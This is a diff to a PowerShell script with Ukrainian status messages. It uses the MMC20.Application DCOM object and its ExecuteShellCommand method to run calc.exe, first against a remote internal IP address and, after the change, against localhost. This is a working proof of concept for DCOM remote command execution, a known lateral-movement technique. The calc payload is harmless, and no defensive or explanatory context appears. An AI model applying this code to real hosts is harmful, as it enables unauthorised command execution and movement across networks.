@@ -1,1 +1,17 @@
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.76.2.171"))
+$target = "127.0.0.1"
+
+try {
+    Write-Host "Підключаюсь до $target..."
+    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
+    Write-Host "Підключено!"
+    
+    $doc = $com.Document
+    $view = $doc.ActiveView
+    
+    Write-Host "Запускаю calc.exe..."
+    $view.ExecuteShellCommand("calc.exe", $null, $null, 7)
+    Write-Host "Готово!"
+}
+catch {
+    Write-Host "Помилка: $_" -ForegroundColor Red
+}
